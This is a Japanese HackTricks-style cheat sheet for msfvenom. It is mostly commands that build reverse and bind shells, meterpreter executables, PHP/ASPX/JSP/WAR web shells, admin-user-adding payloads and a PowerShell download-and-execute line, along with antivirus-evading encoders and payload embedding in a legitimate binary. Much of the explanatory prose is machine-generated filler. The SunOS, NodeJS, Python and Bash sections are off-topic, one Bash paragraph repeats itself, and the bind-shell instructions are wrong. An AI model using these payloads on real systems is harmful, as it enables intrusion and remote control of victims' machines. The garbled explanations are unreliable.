# MSFVenom - チートシート

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

または、`-a`を使用してアーキテクチャを指定するか、`--platform`を使用することもできます。

## リスト表示
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## シェルコードを作成する際の一般的なパラメータ

When creating a shellcode, there are several common parameters that can be used to customize its behavior. These parameters include:

- **LHOST**: The local host IP address or hostname to which the shellcode will connect back.
- **LPORT**: The local port number on the host to which the shellcode will connect back.
- **RHOST**: The remote host IP address or hostname to which the shellcode will connect.
- **RPORT**: The remote port number on the host to which the shellcode will connect.
- **EXITFUNC**: The method used to exit the shellcode after execution (e.g., thread, process, seh, none).
- **Encoder**: The encoding algorithm used to obfuscate the shellcode.
- **BadChars**: A list of characters that should not be present in the shellcode.
- **Payload**: The specific payload to be used (e.g., reverse shell, bind shell, meterpreter).

シェルコードを作成する際には、その動作をカスタマイズするために使用できるいくつかの一般的なパラメータがあります。これらのパラメータには以下が含まれます：

- **LHOST**：シェルコードが接続するローカルホストのIPアドレスまたはホスト名。
- **LPORT**：シェルコードが接続するホスト上のローカルポート番号。
- **RHOST**：シェルコードが接続するリモートホストのIPアドレスまたはホスト名。
- **RPORT**：シェルコードが接続するホスト上のリモートポート番号。
- **EXITFUNC**：シェルコードの実行後に使用される終了方法（スレッド、プロセス、seh、なし）。
- **Encoder**：シェルコードを曖昧化するために使用されるエンコーディングアルゴリズム。
- **BadChars**：シェルコードに含まれてはならない文字のリスト。
- **Payload**：使用する具体的なペイロード（リバースシェル、バインドシェル、メータプリータなど）。
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **リバースシェル**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### バインドシェル

バインドシェルは、攻撃者がリモートシステムに接続し、システムの制御を取得するための一種のリモートシェルです。バインドシェルを使用すると、攻撃者はリモートシステム上でコマンドを実行し、ファイルの操作やシステムの制御を行うことができます。

バインドシェルを作成するために、msfvenomツールを使用することができます。以下のコマンドを使用して、バインドシェルを作成します。

```plaintext
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<attacker_port> -f <format> -o <output_file>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<attacker_ip>`: 攻撃者のIPアドレスを指定します。
- `<attacker_port>`: 攻撃者が接続するポート番号を指定します。
- `<format>`: 出力ファイルの形式を指定します。
- `<output_file>`: 作成されるバインドシェルの出力先ファイルを指定します。

バインドシェルを作成した後は、攻撃者はバインドシェルをリモートシステムに配置し、接続することができます。これにより、攻撃者はリモートシステム上でコマンドを実行し、システムを制御することができます。

バインドシェルは、攻撃者がリモートシステムに物理的なアクセス権限を持っていなくても、システムに侵入し制御するための効果的な手法です。
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
To create a user, you can use the `msfvenom` tool in Metasploit. The `msfvenom` tool allows you to generate various types of payloads, including shellcode, which can be used to create a user on a target system.

Here is an example command to create a user using `msfvenom`:

```plaintext
msfvenom -p windows/adduser USER=username PASS=password -f exe > adduser.exe
```

This command will generate an executable file called `adduser.exe`, which, when executed on a Windows system, will create a new user with the specified username and password.

You can customize the payload according to your needs, such as specifying the target architecture, payload format, and other options. Refer to the `msfvenom` documentation for more information on available options and payload types.

Remember to use this technique responsibly and only on systems that you have proper authorization to access.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMDシェル

The CMD shell is a command-line interpreter for Windows operating systems. It provides a way to interact with the operating system by executing commands and scripts. The CMD shell is commonly used by system administrators and power users for various tasks, including managing files and directories, running programs, and configuring system settings.

To create a CMD shell payload using msfvenom, you can use the following command:

```
msfvenom -p windows/shell/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

This command generates a reverse TCP shell payload that connects back to the attacker's machine. You need to replace `<attacker IP>` with your IP address and `<attacker port>` with the port number you want to use for the connection.

Once you have generated the payload, you can transfer it to the target machine and execute it. This will establish a reverse TCP connection between the target machine and your machine, allowing you to execute commands on the target machine.

To listen for the incoming connection and interact with the CMD shell, you can use the `nc` command or a similar tool on your machine. For example:

```
nc -lvp <attacker port>
```

Replace `<attacker port>` with the same port number you used in the msfvenom command.

Once the connection is established, you can execute commands on the target machine through the CMD shell. Keep in mind that you may need to bypass antivirus or other security measures to successfully execute the payload and establish the connection.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **コマンドの実行**

To execute a command using msfvenom, you can use the following syntax:

```
msfvenom -p <payload> [options]
```

Here, `<payload>` refers to the payload you want to use, and `[options]` represents any additional options you want to include.

For example, to generate a reverse shell payload using msfvenom, you can use the following command:

```
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

In this command, `<payload>` should be replaced with the desired payload, `<attacker IP>` should be replaced with the IP address of the attacker machine, `<attacker port>` should be replaced with the port number the attacker machine is listening on, `<format>` should be replaced with the desired output format, and `<output file>` should be replaced with the name of the file where the payload will be saved.

Once the payload is generated, you can execute it on the target machine to establish a reverse shell connection with the attacker machine.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### エンコーダ

An encoder is a tool used in hacking to obfuscate or encode malicious payloads. It is commonly used to bypass security measures such as antivirus software. By encoding the payload, the hacker can make it more difficult for security systems to detect and analyze the malicious code.

エンコーダは、悪意のあるペイロードを曖昧化またはエンコードするために使用されるツールです。これは、アンチウイルスソフトウェアなどのセキュリティ対策を回避するために一般的に使用されます。ペイロードをエンコードすることで、ハッカーはセキュリティシステムが悪意のあるコードを検出および分析するのをより困難にすることができます。
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 実行可能ファイルに埋め込まれた形で

To embed a payload inside an executable file, you can use the `msfvenom` tool from the Metasploit Framework. This allows you to create a custom payload and inject it into an existing executable file without modifying its functionality.

To generate the payload, use the following command:

```
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

Replace `<payload>` with the desired payload, `<attacker IP>` with your IP address, `<attacker port>` with the port you want to listen on, `<format>` with the desired output format (e.g., exe, elf, macho), and `<output file>` with the name of the output file.

For example, to embed a reverse shell payload into a Windows executable file, you can use the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o payload.exe
```

This will generate a file named `payload.exe` that contains the reverse shell payload.

Once you have the payload, you can transfer it to the target system and execute it. When the executable file is run on the target system, it will establish a connection back to your machine, giving you remote access to the target.

Remember to use this technique responsibly and only on systems that you have proper authorization to access.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
### リバースシェル

リバースシェルは、ターゲットマシンから攻撃者のマシンに接続するためのペイロードです。これにより、攻撃者はターゲットマシン上でコマンドを実行し、システムにアクセスすることができます。

以下は、リバースシェルの作成方法の例です。

```bash
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<attacker_port> -f <format> -o <output_file>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<attacker_ip>`: 攻撃者のマシンのIPアドレスを指定します。
- `<attacker_port>`: 攻撃者のマシンで待ち受けるポート番号を指定します。
- `<format>`: 出力ファイルの形式を指定します。
- `<output_file>`: 出力ファイルのパスと名前を指定します。

例えば、以下のコマンドは、Linuxシステムで使用するリバースシェルを作成します。

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o reverse_shell.elf
```

このコマンドは、`linux/x86/shell_reverse_tcp`ペイロードを使用し、攻撃者のIPアドレスが`192.168.0.100`で、ポート番号が`4444`であるリバースシェルを作成します。出力ファイルは`reverse_shell.elf`という名前で保存されます。

作成したリバースシェルをターゲットマシンに配置し、攻撃者のマシンで待ち受けるポートに接続することで、リバースシェルを実行することができます。これにより、攻撃者はターゲットマシンに対してコマンドを送信し、システムにアクセスすることができます。
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### バインドシェル

バインドシェルは、攻撃者がリモートシステムに接続し、システムの制御を取得するための一種のリモートシェルです。バインドシェルを使用すると、攻撃者はリモートシステム上でコマンドを実行し、ファイルの操作やシステムの制御を行うことができます。

バインドシェルを作成するために、msfvenomツールを使用することができます。以下のコマンドを使用して、バインドシェルを作成します。

```plaintext
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<attacker_port> -f <format> -o <output_file>
```

- `<payload>`: 使用するペイロードの種類を指定します。
- `<attacker_ip>`: 攻撃者のIPアドレスを指定します。
- `<attacker_port>`: 攻撃者が接続するポート番号を指定します。
- `<format>`: 出力ファイルの形式を指定します。
- `<output_file>`: 作成されるバインドシェルの出力先ファイルを指定します。

バインドシェルを作成した後は、攻撃者はバインドシェルをリモートシステムに配置し、接続することで制御を取得できます。
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS（Solaris）

SunOS is a Unix-based operating system developed by Sun Microsystems. It is commonly used in enterprise environments and is known for its stability and scalability. SunOS provides a secure and reliable platform for running mission-critical applications.

SunOS has its own set of vulnerabilities that can be exploited by hackers. By understanding these vulnerabilities, hackers can gain unauthorized access to SunOS systems and compromise their security.

Here are some common vulnerabilities found in SunOS:

1. **Remote Code Execution**: Hackers can exploit vulnerabilities in SunOS to execute arbitrary code remotely. This can be done by sending specially crafted packets or by exploiting vulnerable services running on the system.

2. **Privilege Escalation**: Once a hacker gains access to a SunOS system, they may attempt to escalate their privileges to gain higher levels of access. This can be done by exploiting vulnerabilities in the operating system or by leveraging misconfigurations in system settings.

3. **Information Disclosure**: Hackers can also exploit vulnerabilities in SunOS to gain access to sensitive information stored on the system. This can include user credentials, configuration files, or other confidential data.

To protect SunOS systems from these vulnerabilities, it is important to keep the operating system and all installed software up to date with the latest security patches. Additionally, implementing strong access controls, such as strong passwords and multi-factor authentication, can help prevent unauthorized access to the system.

By understanding the vulnerabilities and taking appropriate security measures, system administrators can mitigate the risk of SunOS systems being compromised by hackers.
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC ペイロード**

### **リバースシェル:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **バインドシェル**

A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command-line interface to interact with the target system. This allows the attacker to execute commands and control the target remotely.

To create a bind shell using `msfvenom`, you can use the following command:

```
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use for the bind shell. This can be a reverse shell payload or any other payload that provides a shell.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port on which the bind shell will listen for incoming connections.
- `<format>`: The format in which the payload should be generated (e.g., exe, elf, etc.).
- `<output file>`: The file to which the generated payload should be saved.

Once the bind shell payload is generated, you can transfer it to the target system and execute it. This will start the bind shell and listen for incoming connections on the specified port.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Webベースのペイロード**

### **PHP**

#### 逆シェル
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f aspx -o shell.aspx
```

このコマンドは、Windowsシステムに対して逆接続シェルを提供するASP/x形式のファイルを生成します。`<your IP>`と`<your port>`は、逆接続シェルを受け取るIPアドレスとポート番号に置き換える必要があります。生成されたファイルは`shell.aspx`という名前で保存されます。
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
#### リバースシェル

リバースシェルは、ターゲットマシンに接続するために使用されるシェルです。JSP（Java Server Pages）を使用してリバースシェルを作成する方法について説明します。

1. Metasploitの`msfvenom`コマンドを使用して、JSPファイルを生成します。

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f raw > shell.jsp
```

2. 生成された`shell.jsp`ファイルをターゲットマシンにアップロードします。

3. ターゲットマシンでWebサーバを起動し、`shell.jsp`ファイルにアクセスします。

4. Metasploitの`multi/handler`モジュールを使用して、リバースシェルの接続を待機します。

```plaintext
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
run
```

5. ターゲットマシンが`shell.jsp`ファイルにアクセスすると、リバースシェルが確立され、攻撃者はターゲットマシンに対してコマンドを実行できるようになります。

リバースシェルを使用する際には、権限の制限やセキュリティ対策に注意してください。また、合法的な目的のためにのみ使用してください。
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
The **WAR** file format is commonly used in Java web applications. It stands for Web Application Archive and is essentially a compressed file that contains all the necessary files and resources for a web application to run.

One of the common uses of a WAR file is to deploy a web application to a server. However, as a hacker, you can also leverage the WAR file format to deliver a reverse shell payload to a target system.

A **reverse shell** is a type of shell in which the target system initiates a connection to the attacker's machine, allowing the attacker to gain remote access and control over the target system.

To create a reverse shell payload in a WAR file, you can use the `msfvenom` tool, which is part of the Metasploit Framework. `msfvenom` allows you to generate various types of payloads, including reverse shells, with different options and configurations.

Here is an example command to generate a reverse shell payload in a WAR file using `msfvenom`:

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f war > reverse_shell.war
```

In this command, you need to replace `<attacker_ip>` with your IP address and `<attacker_port>` with the port number on which you want to listen for the reverse shell connection.

Once you have generated the reverse shell payload in the form of a WAR file, you can deploy it to a vulnerable web server or deliver it to the target system through other means, such as social engineering or exploiting a vulnerability.

When the WAR file is executed on the target system, it establishes a reverse shell connection back to your machine, giving you remote access and control over the target system.

Remember to use these techniques responsibly and only on systems that you have proper authorization to test or assess for security vulnerabilities.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJSは、JavaScriptランタイム環境であり、サーバーサイドのアプリケーション開発に使用されます。NodeJSは、非同期イベント駆動型のアーキテクチャを持ち、高いパフォーマンスとスケーラビリティを提供します。

NodeJSを使用してWebアプリケーションを開発する場合、以下の手順に従うことが一般的です。

1. 必要なパッケージのインストール
2. サーバーの作成と設定
3. ルーティングの設定
4. リクエストの処理
5. データベースの操作
6. レスポンスの生成
7. エラーハンドリング

NodeJSは、多くの便利なフレームワークやモジュールを提供しており、これらを活用することで開発効率を向上させることができます。また、NodeJSはセキュリティにも注意が必要であり、適切な認証や権限管理を実装することが重要です。

NodeJSは、Webアプリケーションの開発だけでなく、ネットワークプログラミングやマイクロサービスの構築など、さまざまな用途に利用することができます。そのため、NodeJSの基本的な知識を身につけることは、現代の開発者にとって非常に重要です。
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **スクリプト言語のペイロード**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

### 概要

Pythonは、高水準のプログラミング言語であり、多くの用途に使用されています。Pythonは、シンプルで読みやすい構文を持ち、幅広いライブラリとモジュールが利用できます。この言語は、ネットワーキング、Web開発、データ解析、機械学習など、さまざまな分野で使用されています。

### メリット

- シンプルで読みやすい構文
- 幅広いライブラリとモジュールのサポート
- クロスプラットフォーム対応
- 多くのフレームワークとの統合が容易
- 大規模なコミュニティとサポート

### デメリット

- 実行速度が他の言語に比べて遅い場合がある
- メモリ使用量が大きい場合がある
- スレッドセーフではない

### インストール

Pythonの最新バージョンは、公式ウェブサイトからダウンロードできます。また、多くのオペレーティングシステムには、デフォルトでPythonがインストールされている場合もあります。

### 使用例

以下は、PythonでHello Worldを表示する簡単なプログラムの例です。

```python
print("Hello World!")
```

### まとめ

Pythonは、シンプルで読みやすい構文と豊富なライブラリのサポートを持つ高水準のプログラミング言語です。多くの分野で使用されており、クロスプラットフォーム対応やフレームワークとの統合が容易な点が特徴です。ただし、実行速度やメモリ使用量には注意が必要です。
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash（バッシュ）**

Bash（バッシュ）は、Unixシェルおよびコマンド言語の一種です。Bashは、LinuxやmacOSなどの多くのオペレーティングシステムでデフォルトのシェルとして使用されています。Bashは、シェルスクリプトの作成や実行、コマンドの実行、ファイルの操作など、さまざまなタスクを実行するために使用されます。

Bashスクリプトは、テキストファイルとして保存され、実行可能な権限が与えられることで実行することができます。Bashスクリプトは、シェルコマンドや制御構造（if文、forループなど）を使用して、複数のコマンドを連続して実行することができます。

Bashは、シェルスクリプトの作成や実行、コマンドの実行、ファイルの操作など、さまざまなタスクを実行するために使用されます。Bashは、シェルスクリプトの作成や実行、コマンドの実行、ファイルの操作など、さまざまなタスクを実行するために使用されます。

Bashは、シェルスクリプトの作成や実行、コマンドの実行、ファイルの操作など、さまざまなタスクを実行するために使用されます。Bashは、シェルスクリプトの作成や実行、コマンドの実行、ファイルの操作など、さまざまなタスクを実行するために使用されます。
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグ報酬について通知を受ける

💬 コミュニティのディスカッションに参加する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
